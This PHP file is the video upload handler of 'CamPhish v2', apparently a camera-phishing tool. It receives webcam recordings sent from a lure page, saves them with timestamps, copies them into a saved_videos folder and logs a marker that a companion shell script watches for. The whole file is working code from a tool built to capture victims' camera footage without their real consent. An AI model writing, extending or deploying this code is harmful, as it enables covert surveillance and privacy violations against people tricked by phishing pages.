<?php
// CamPhish v2 - Video Upload Handler

$date = date('dMYHis');

if (isset($_FILES['video']) && $_FILES['video']['error'] === UPLOAD_ERR_OK) {
    $maxSize = 50 * 1024 * 1024; // 50MB max
    
    if ($_FILES['video']['size'] > $maxSize) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'File too large']);
        exit();
    }
    
    // Validate file type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $_FILES['video']['tmp_name']);
    finfo_close($finfo);
    
    $allowedTypes = ['video/webm', 'video/mp4', 'video/ogg', 'application/octet-stream'];
    
    if (!in_array($mimeType, $allowedTypes)) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Invalid file type']);
        exit();
    }
    
    // Save video file
    $filename = 'video_' . $date . '.webm';
    
    if (move_uploaded_file($_FILES['video']['tmp_name'], $filename)) {
        // Create marker for shell script
        error_log("Video received\r\n", 3, "Log.log");
        
        // Save to videos directory
        if (!is_dir('saved_videos')) {
            mkdir('saved_videos', 0755, true);
        }
        copy($filename, 'saved_videos/' . $filename);
        
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'file' => $filename]);
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Upload failed']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'No video data']);
}

exit();
?>
